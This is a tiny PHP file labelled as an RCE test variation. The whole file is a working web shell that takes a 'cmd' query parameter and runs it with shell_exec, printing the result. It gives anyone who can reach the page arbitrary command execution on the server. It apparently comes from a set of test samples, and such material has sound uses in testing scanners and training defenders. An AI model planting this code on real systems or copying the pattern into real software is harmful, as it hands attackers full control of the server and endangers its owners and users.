<?php
// RCE test variation #41
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>